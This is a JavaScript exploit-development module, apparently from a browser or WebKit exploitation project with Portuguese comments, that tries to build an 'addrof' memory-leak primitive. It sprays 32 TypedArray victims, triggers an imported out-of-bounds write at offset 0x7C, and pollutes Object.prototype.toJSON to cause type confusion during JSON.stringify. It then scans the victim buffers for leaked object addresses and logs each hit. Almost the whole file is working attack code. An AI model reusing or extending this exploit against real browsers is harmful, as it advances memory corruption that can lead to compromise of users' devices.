// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v20_MultiVictimSpray)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V20_MVS = "OriginalHeisenbug_TypedArrayAddrof_v20_MultiVictimSpray";

const VICTIM_BUFFER_SIZE_V20 = 64; // Tamanho menor para cada vítima individual no spray
const NUM_VICTIMS_V20 = 32;      // Número de vítimas no spray
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

// Array para armazenar informações sobre cada vítima e suas tentativas de addrof
let victim_spray_data_v20 = []; 
let probe_call_log_v20 = []; // Log simples de chamadas da sonda

function toJSON_TA_Probe_MultiVictimSpray() {
    const callTimestamp = Date.now();
    let this_type = Object.prototype.toString.call(this);
    let victimDataEntry = victim_spray_data_v20.find(entry => entry.victim === this || entry.controller === this);
    let entry_id = victimDataEntry ? victimDataEntry.id : "unknown";

    probe_call_log_v20.push({
        timestamp: callTimestamp,
        this_type: this_type,
        victim_id_associated: entry_id,
        is_actual_victim_ref: (victimDataEntry && this === victimDataEntry.victim)
    });
    
    logS3(`[MVS_Probe_v20] Probe call. ID: ${entry_id}, 'this' type: ${this_type}`, "leak");

    if (victimDataEntry && this === victimDataEntry.victim) { // 'this' é um dos nossos TypedArrays vítima
        if (this_type === '[object Object]') {
            logS3(`[MVS_Probe_v20] VICTIM ID ${entry_id} TYPE CONFUSION DETECTED! Type: ${this_type}`, "vuln");
            victimDataEntry.confused_in_probe = true;
            
            logS3(`[MVS_Probe_v20] Attempting addrof writes on confused victim ID ${entry_id}...`, "warn");
            try {
                if (victimDataEntry.obj_A) this[0] = victimDataEntry.obj_A;
                if (victimDataEntry.obj_B) this[1] = victimDataEntry.obj_B;
                victimDataEntry.writes_attempted_in_probe = true;
                logS3(`[MVS_Probe_v20] Writes to confused victim ID ${entry_id} done. Keys: ${Object.keys(this).join(',')}`, "info");
            } catch (e) {
                logS3(`[MVS_Probe_v20] Error writing to confused victim ID ${entry_id}: ${e.message}`, "error");
                victimDataEntry.probe_write_error = e.message;
            }
        }
    } else if (victimDataEntry && this === victimDataEntry.controller) { // 'this' é um dos nossos objetos controller
         if (this_type === '[object Object]') {
            logS3(`[MVS_Probe_v20] CONTROLLER ID ${entry_id} TYPE CONFUSION DETECTED! Type: ${this_type}`, "vuln");
            victimDataEntry.controller_confused_in_probe = true;
            // Poderíamos tentar escritas no controller aqui se fosse parte da estratégia
         }
    }
    // Retornar um objeto simples e novo para evitar que ele se torne o 'this' da próxima chamada
    return { "mvs_probe_processed_id": entry_id, "timestamp": callTimestamp }; 
}

export async function executeTypedArrayVictimAddrofTest_MultiVictimSpray() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_MVS}.triggerAndSpray`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (MultiVictimSpray) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_MVS} Init...`;

    victim_spray_data_v20 = []; 
    probe_call_log_v20 = [];
    
    let errorCapturedMain = null;
    let stringifyOutput = null; 
    let overall_addrof_success = false;

    try {
        // 1. Preparar o Spray de Vítimas
        logS3(`STEP 1: Preparing victim spray (count: ${NUM_VICTIMS_V20})...`, "info", FNAME_CURRENT_TEST);
        for (let i = 0; i < NUM_VICTIMS_V20; i++) {
            let underlying_ab = new ArrayBuffer(VICTIM_BUFFER_SIZE_V20);
            let typed_array_victim = new Uint8Array(underlying_ab);
            // Preencher com padrão único para cada vítima para fácil identificação se não modificado
            let f64_view = new Float64Array(underlying_ab);
            for (let j = 0; j < f64_view.length; j++) {
                f64_view[j] = 0.1 * i + 0.01 * j; // Padrão único
            }

            victim_spray_data_v20.push({
                id: `V${i}`,
                victim: typed_array_victim, // O TypedArray em si
                buffer_view: f64_view,       // A view para checar o addrof
                obj_A: { marker: `ObjA_V${i}`, ts: Date.now() + i },
                obj_B: { marker: `ObjB_V${i}`, ts: Date.now() + 1000 + i },
                confused_in_probe: false,
                writes_attempted_in_probe: false,
                probe_write_error: null,
                addrof_A_success: false,
                addrof_B_success: false,
                addrof_A_leaked_val_hex: null,
                addrof_B_leaked_val_hex: null
            });
        }
        logS3(`   Victim spray prepared. Total entries: ${victim_spray_data_v20.length}`, "info", FNAME_CURRENT_TEST);

        // 2. Gatilho OOB
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`STEP 2: Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        // 3. Poluir e Chamar JSON.stringify no array de vítimas
        const victims_to_stringify = victim_spray_data_v20.map(entry => entry.victim); // Array apenas dos TypedArrays

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_MultiVictimSpray, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`STEP 3: Object.prototype.toJSON polluted. Calling JSON.stringify on the array of ${victims_to_stringify.length} victims...`, "warn", FNAME_CURRENT_TEST);
            
            stringifyOutput = JSON.stringify(victims_to_stringify); 
            
            logS3(`  JSON.stringify completed. Output length (if string): ${typeof stringifyOutput === 'string' ? stringifyOutput.length : 'N/A (not a string)'}`, "info", FNAME_CURRENT_TEST);
            // Não vamos logar o stringifyOutput inteiro pois pode ser massivo.
            
            // 4. Analisar Resultados
            logS3("STEP 4: Analyzing results from victim spray...", "warn", FNAME_CURRENT_TEST);
            for (let entry of victim_spray_data_v20) {
                const val_A = entry.buffer_view[0];
                let temp_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A]).buffer)[0], new Uint32Array(new Float64Array([val_A]).buffer)[1]);
                entry.addrof_A_leaked_val_hex = temp_A_int64.toString(true);
                if (val_A !== (0.1 * parseInt(entry.id.substring(1)) + 0.01 * 0) && val_A !== 0 && 
                    (temp_A_int64.high() < 0x00020000 || (temp_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    entry.addrof_A_success = true;
                    overall_addrof_success = true;
                    logS3(`  !!!! POTENTIAL ADDROF A for Victim ${entry.id} !!!! Value: ${val_A} (${entry.addrof_A_leaked_val_hex})`, "vuln", FNAME_CURRENT_TEST);
                }

                const val_B = entry.buffer_view[1];
                let temp_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_B]).buffer)[0], new Uint32Array(new Float64Array([val_B]).buffer)[1]);
                entry.addrof_B_leaked_val_hex = temp_B_int64.toString(true);
                 if (val_B !== (0.1 * parseInt(entry.id.substring(1)) + 0.01 * 1) && val_B !== 0 && 
                    (temp_B_int64.high() < 0x00020000 || (temp_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    entry.addrof_B_success = true;
                    overall_addrof_success = true;
                    logS3(`  !!!! POTENTIAL ADDROF B for Victim ${entry.id} !!!! Value: ${val_B} (${entry.addrof_B_leaked_val_hex})`, "vuln", FNAME_CURRENT_TEST);
                }
            }

            if (overall_addrof_success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_MVS}: Addr? SUCESSO!`;
            } else {
                 let anyVictimConfused = victim_spray_data_v20.some(e => e.confused_in_probe);
                 if (anyVictimConfused) {
                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_MVS}: TC OK, Addr Fail`;
                 } else {
                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_MVS}: No TC, Addr Fail`;
                 }
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    CRITICAL ERROR during JSON.stringify or analysis: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_MVS}: Stringify/Analysis ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_MVS} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls recorded: ${probe_call_log_v20.length}`, "info", FNAME_CURRENT_TEST);
        
        victim_spray_data_v20.forEach(entry => {
            if (entry.addrof_A_success || entry.addrof_B_success || entry.confused_in_probe) {
                logS3(`Result for Victim ${entry.id}: ConfusedInProbe=${entry.confused_in_probe}, WritesAttempted=${entry.writes_attempted_in_probe}, AddrA=${entry.addrof_A_success} (${entry.addrof_A_leaked_val_hex}), AddrB=${entry.addrof_B_success} (${entry.addrof_B_leaked_val_hex})`, 
                      (entry.addrof_A_success || entry.addrof_B_success) ? "good" : "info", FNAME_CURRENT_TEST);
                if(entry.probe_write_error) logS3(`  Probe Write Error for ${entry.id}: ${entry.probe_write_error}`, "warn", FNAME_CURRENT_TEST);
            }
        });
        
        // Limpeza
        victim_spray_data_v20 = []; 
        probe_call_log_v20 = [];
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResultLength: typeof stringifyOutput === 'string' ? stringifyOutput.length : (stringifyOutput === null ? 0 : -1), 
        overall_addrof_success: overall_addrof_success,
        victim_results: victim_spray_data_v20.map(e => ({ // Retorna um resumo menor
            id: e.id, 
            confused: e.confused_in_probe, 
            addrof_A: e.addrof_A_success, 
            addrof_B: e.addrof_B_success
        }))
    };
}
